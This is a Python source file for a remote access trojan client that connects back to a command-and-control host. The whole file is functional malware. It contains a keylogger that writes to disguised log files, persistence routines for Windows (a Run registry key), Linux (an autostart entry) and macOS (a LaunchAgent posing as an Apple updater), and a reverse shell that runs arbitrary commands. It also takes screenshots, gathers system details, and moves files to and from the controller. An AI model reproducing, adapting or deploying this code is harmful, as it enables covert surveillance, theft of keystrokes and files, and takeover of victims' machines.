#!/usr/bin/env python3
import os
import sys
import socket
import subprocess
import threading
import json
import platform
import shutil
import time
import stat
import requests
import getpass
import zipfile
import string
from pynput.keyboard import Listener
import pyautogui
from app.variables import CONTROLLER_IP, PORT

# TEMPLATES
template_plist = string.Template("""#!/bin/bash
echo '<plist version="1.0">
<dict>
<key>Label</key>
<string>${LABEL}</string>
<key>ProgramArguments</key>
<array>
<string>/usr/bin/python</string>
<string>${FILE}</string>
</array>
<key>RunAtLoad</key>
<true/>
<key>StartInterval</key>
<integer>180</integer>
<key>AbandonProcessGroup</key>
<true/>
</dict>
</plist>' > ~/Library/LaunchAgents/${LABEL}.plist
chmod 600 ~/Library/LaunchAgents/${LABEL}.plist
launchctl load ~/Library/LaunchAgents/${LABEL}.plist
exit""")

class Slave:
    def __init__(self, controller_ip=CONTROLLER_IP, port=PORT, interval_sec=15):
        self.controller_ip = controller_ip 
        self.port = port
        self.interval_sec = interval_sec
        self.persisted_path = ""
        self.log = "[+] BEGIN LOG "
        self.log_path = ""
        # self.persist()
        self.client()
        
    
    # def execute_front_file(self):
    #     if (not os.path.exists(self.persisted_path)):
    #         file_name = sys._MEIPASS + "/<path>"
    #         try:
    #             subprocess.Popen(file_name, shell=True)
    #         except:
    #             n = 1
    #             n2 = 2
    #             n3 = n + n2

    def process_keypress(self, key):
        """
        Allocates necessary handling to process each keypress.
        """
        
        ephemeral_key = str(key).replace("'", "")
        if (ephemeral_key.find('backspace') > 0):
            ephemeral_key = ' Backspace '
        elif (ephemeral_key.find('enter') > 0):
            ephemeral_key = '\n' 
        elif (ephemeral_key.find('shift') > 0):
            ephemeral_key = ' Shift '
        elif (ephemeral_key.find('space') > 0):
            ephemeral_key = ' '
        elif (ephemeral_key.find('caps_lock') > 0):
            ephemeral_key = ' caps_lock '
        elif (ephemeral_key.find('Key')):
            ephemeral_key = ephemeral_key
        else:
            ephemeral_key = ""
        self.update_log(ephemeral_key)

    def update_log(self, string):
        """
        Updates log.
        """
        self.log += string

    def report_log(self):
        """
        Opens thread to report log at n interval.
        """  
        with open(self.log_path, "a+") as file:
            file.write(self.log)
            file.close()
        self.log = ""
        timer = threading.Timer(10, self.report_log)
        timer.start()
    
    def initialize_keylogger(self):
        if (sys.platform.startswith("win32") or sys.platform.startswith("cygwin")):
            self.log_path = os.environ["appdata"] + "\\cygwin_2_0300.txt"
        elif (sys.platform.startswith("darwin")):
            self.log_path = os.path.expanduser('~') + "/Library/Logs/DiagnosticReports/.DS_Store.log" 
        elif (sys.platform.startswith("linux")):
            home_config_directory = os.path.expanduser('~') + "/.config/"
            autostart_path = home_config_directory + "/autostart/"
            self.log_path = autostart_path + "gnome.desktop"
            if (not os.path.isfile(self.log_path)):
                try:
                    os.makedirs(autostart_path)
                except OSError:
                    pass
        else:
            pass
        with Listener(on_press=self.process_keypress) as keyboard_listener:
            self.report_log()
            keyboard_listener.join()
    
    def run_keylogger(self):
        try:
            thread_1 = threading.Thread(target=self.initialize_keylogger)
            thread_1.start()
            return "[+] Keylogger initialized. Issue command `dump_cache` to pull/flush logs."
        except Exception as stderr:
            return f"[-] Failed to initialize keylogger. See {stderr}"

    def expand_path(self, path):
        """ Expand environment variables and metacharacters in a path """
        return os.path.expandvars(os.path.expanduser(path))

    def chmod_to_exec(self, file):
        os.chmod(file, os.stat(file).st_mode | stat.S_IEXEC)
        
    def persist(self):
        if (sys.platform.startswith("win")):
            self.persist_windows()
        elif (sys.platform.startswith("linux")):
            self.persist_linux()
            pass
        elif (sys.platform.startswith("darwin")):
            self.persist_macos()
            pass

    def persist_windows(self):
        self.persisted_path = os.environ["appdata"] + "\\Windows32.exe"
        if not os.path.exists(self.persisted_path):
            shutil.copyfile(sys.executable, self.persisted_path)
            subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v win32 /t REG_SZ /d "' + self.persisted_path + '"', shell=True)

    def persist_linux(self):
        home_config_directory = os.path.expanduser('~') + "/.config/"
        autostart_path = home_config_directory + "/autostart/"
        autostart_file = autostart_path + "xinput.desktop"
        if not os.path.isfile(autostart_file):
            try:
                os.makedirs(autostart_path)
            except OSError:
                pass
            self.persisted_path = home_config_directory + "xnput"
            shutil.copyfile(sys.executable, self.persisted_path)
            self.chmod_to_exec(self.persisted_path)
            with open(autostart_file, 'w') as out:
                out.write("[Desktop Entry]\nType=Application\nX-GNOME-Autostart-enabled=true\n")
                out.write("Name=Xinput\nExec=" + self.persisted_path + "\n")
            self.chmod_to_exec(autostart_file)
            subprocess.Popen(self.persisted_path)
            sys.exit()
    
    def persist_macos(self):
        value = sys.executable
        label = "com.apple.update.manager"
        file_path = f"/var/tmp/.{label}.sh"
        bash = template_plist.substitute(LABEL=label, FILE=value)
        try:
            if (not os.path.exists("/var/tmp")):
                os.makedirs("/var/tmp")
            with open(file_path, "w") as file:
                file.write(bash)
            bin_sh = bytes().join(subprocess.Popen(f"/bin/sh {file_path}", 0, None, None, subprocess.PIPE, subprocess.PIPE, shell=True).communicate())
            time.sleep(1)
            launch_agent= os.path.join(os.environ.get('HOME'), f"Library/LaunchAgents/{label}.plist")
            if (os.path.isfile(launch_agent)):
                os.remove(file_path)
            else:
                pass
        except:
            pass
        
    def execute_system_cmd(self, command):
        # return subprocess.check_output(cmd, shell=True)
        DEVNULL = open(os.devnull, "wb")
        proc = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=DEVNULL)
        proc_output = proc.stdout.read() + proc.stderr.read()
        # proc_output = proc.communicate()[0]
        return proc_output.decode()
    
    # def initialize_external_application(self, executable):
    #     """
    #     Initialize a given program on host machine in a non-blocking manner.
    #     """
    #     try:
    #         subprocess.Popen(executable, shell=True)
    #         return "[+] Successfully initialized {}".format(executable)
    #     except Exception as stderr:
    #         return "[-] Failed to initialize {}. See {}".format(executable, stderr)
    
    def eval_is_admin(self):
        """
        Conducts an OS-contingent evaluation to determine the host's privileges 
        *while in the script* (impt).
        """
        if (platform == "win32" or platform == "cygwin"):
            try:
                # only windows users with admin privileges can read C:\windows\temp
                tmp = os.listdir(os.sep.join([os.environ.get('SystemRoot','C:\\windows'),'temp']))
            except:
                return False
            else:
                return True
        else: # POSIX
            return True if ('SUDO_USER' in os.environ and os.geteuid() == 0) else False
            
    def epistem_sys(self):
        """
        Retrieves and collates host hardware/system information.
        """
        try:
            uname = platform.uname()
            osys = uname[0] + " " + uname[2] + " " + uname[3]
            processor = uname[4] + " / " + uname[5]
            general_platform_info = platform.platform()
            user = getpass.getuser()
            is_admin = self.eval_is_admin()
            return "[+] System Information" + "\nOperating System:\t" + osys + "\nProcessor:\t\t" + processor + "\nHost Name:\t\t" + uname[1] + "\nUsername:\t\t" + user + "\nAdmin:\t\t\t" + str(is_admin) + "\nGeneral:\t\t" + general_platform_info
        except:
            return "[-] Unable to retrieve system information."

    def render_zip(self, zip_name, zip_path):
        """ 
        Zips a folder or file.
        """
        try:
            zip_name = self.expand_path(zip_name)
            zip_path = self.expand_path(zip_path)
            if (not os.path.exists(zip_path)):
                return "[-] No such file or directory: %s" % zip_path
            zip_file = zipfile.ZipFile(zip_name, 'w', zipfile.ZIP_DEFLATED)
            if (os.path.isdir(zip_path)):
                relative_path = os.path.dirname(zip_path)
                for root, dirs, files in os.walk(zip_path):
                    for file in files:
                        zip_file.write(os.path.join(root, file), os.path.join(root, file).replace(relative_path, '', 1))
            else:
                zip_file.write(zip_path, os.path.basename(zip_path))
            zip_file.close()
            return "[+] Archive %s successfully created." % zip_name
        except Exception as stderr:
            return f"[-] An error occurred. See {stderr}"

    def download_file(self, url): 
        try:
            response = requests.get(url)
            file_name = url.split("/")[-1]
            with open(file_name, "wb") as file:
                file.write(response.content)
            return "[+] File download successful."
        except Exception as stderr:
            return f"[-] An error occurred. See {stderr}"
    
    def screenshot(self):
        try:
            cap = pyautogui.screenshot()
            cap.save('screen.png')
            self.send_file('screen.png')
            os.remove('screen.png')
        except:
            pass
            
    def change_working_dir(self, path):
        try:
            os.chdir(path)
            return f"[+] Navigating to directory {path}"
        except Exception as stderr:
            return f"[-] An error occurred. See {stderr}"

    def send_file(self, path):
        with open(path, "rb") as file:
            self.connection.send(file.read())

    def recv_file(self, path):
        with open(path, "wb") as file:
            self.connection.settimeout(3)
            buffer = self.connection.recv(1024)
            while buffer:
                file.write(buffer)
                try:
                    buffer = self.connection.recv(1024)
                except socket.timeout:
                    pass
            self.connection.settimeout(None)
            file.close()

    def serialize(self, data):
        """
        Stream data on broadcast.
        """
        json_data = json.dumps(data)
        json_data = json_data.encode()
        self.connection.send(json_data)

    def deserialize(self):
        """
        Stream data on reception.
        """
        data = ""
        while True:
            try:
                data += self.connection.recv(1024).decode()
                return json.loads(data)
            # less bytes than specified throughput; add to next iteration
            except ValueError: 
                continue

    def est_connection(self):
        while True:
            time.sleep(self.interval_sec)
            try:
                self.connection.connect((self.controller_ip, self.port))
                self.shell()
            except:
                self.est_connection()

    def shell(self):
        """
        Reverse shell; processes received commands and delivers cooresponseponding response
        to C2 instance via socket.
        """
        while True:
            response = None
            try:
                command = self.deserialize()
                # for line in command:
                #     line = line.rstrip()
                primary_command = command[0]
                if (primary_command == "exit" or primary_command == "help"):
                    continue
                elif (primary_command == "kill"):
                    self.connection.close()
                    break
                    # TODO wrap socket inside thread so it doesnt exit connection-attempt loop
                elif (primary_command == "exec_all"):
                    response = self.execute_system_cmd(command[1])
                elif (primary_command == "cd" and len(command) > 1): 
                    response = self.change_working_dir(command[1])
                # host uploads to server
                elif (primary_command == "download" and len(command) > 1): 
                    self.send_file(command[1])
                # host downloads from server
                # elif (primary_command == "upload" and len(command) > 1): 
                #     self.recv_file(command[1])
                elif (primary_command == "get" and len(command) > 1): 
                    response = self.download_file(command[1])
                elif (primary_command == "screenshot"):
                    self.screenshot()
                elif (primary_command == "vivisect"):
                    response = self.epistem_sys()
                elif (primary_command == "zipfile" and len(command) > 1): # usage: zip <archive_name> <folder>')
                    response = self.render_zip(command[1], command[2])
                elif (primary_command == "keylogger"):
                    response = self.run_keylogger()
                elif (primary_command == "dump_cache"):
                    self.send_file(self.log_path)
                # elif (primary_command == "start"):

                #     response = self.initialize_external_application(command[1])
                else:
                    response = self.execute_system_cmd(command)
            except Exception as stderr:
                response = f"[-] An error occurred during command execution. See {stderr}"
            if (response != None):
                self.serialize(response)

    def client(self):
        """
        Instantiates a listener obj; listens for and attempts 
        to engender connection w/C2 instance.
        """
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.est_connection()

slave = Slave()